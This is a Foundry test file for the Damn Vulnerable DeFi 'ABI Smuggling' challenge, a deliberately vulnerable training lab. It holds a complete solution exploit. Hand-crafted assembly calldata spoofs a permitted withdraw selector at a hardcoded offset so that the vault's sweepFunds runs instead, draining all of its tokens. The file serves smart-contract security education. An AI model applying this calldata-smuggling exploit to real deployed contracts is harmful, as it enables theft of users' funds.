// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        vault = new SelfAuthorizedVault();

        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    function test_abiSmuggling() public checkSolvedByPlayer {
        // BUG: execute() reads selector from HARDCODED calldata position 100.
        // But the ABI offset for `bytes calldata actionData` is RELATIVE to position 4.
        // If we craft calldata with a non-standard offset, calldataload(100) reads
        // different data than what the ABI decoder decodes as actionData.
        //
        // Layout (232 bytes):
        // 0x00: execute selector (1cff79cd)
        // 0x04: target = vault (32 bytes)
        // 0x24: offset = 0x80 (128, relative to position 4)
        // 0x44: zeros (padding, 32 bytes)
        // 0x64: withdraw selector d9caed12 (position 100 decimal = calldataload target)
        // 0x84: length = 0x44 = 68 (at position 4+128 = 132)
        // 0xa4: sweepFunds selector 85fb709d (at position 164)
        // 0xa8: recovery address (32 bytes)
        // 0xc8: token address (32 bytes)

        address vaultAddr = address(vault);
        address tokenAddr = address(token);
        address recoveryAddr = recovery;
        
        bool success;
        assembly {
            let p := mload(0x40) // free memory pointer
            
            // 0x00: execute selector
            mstore(p, shl(224, 0x1cff79cd))
            // 0x04: target = vault
            mstore(add(p, 0x04), vaultAddr)
            // 0x24: actionData offset = 0x80 (relative to start of params at 0x04)
            mstore(add(p, 0x24), 0x80)
            // 0x44: padding (zeros)
            mstore(add(p, 0x44), 0x00)
            // 0x64: withdraw selector (spoof for permission check at position 100)
            mstore(add(p, 0x64), shl(224, 0xd9caed12))
            // 0x84: actionData length = 68
            mstore(add(p, 0x84), 0x44)
            // 0xa4: sweepFunds selector (what actually executes)
            mstore(add(p, 0xa4), shl(224, 0x85fb709d))
            // 0xa8: recovery address
            mstore(add(p, 0xa8), recoveryAddr)
            // 0xc8: token address
            mstore(add(p, 0xc8), tokenAddr)
            
            success := call(gas(), vaultAddr, 0, p, 0xe8, 0, 0)
        }
        require(success, "exploit failed");
    }

    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
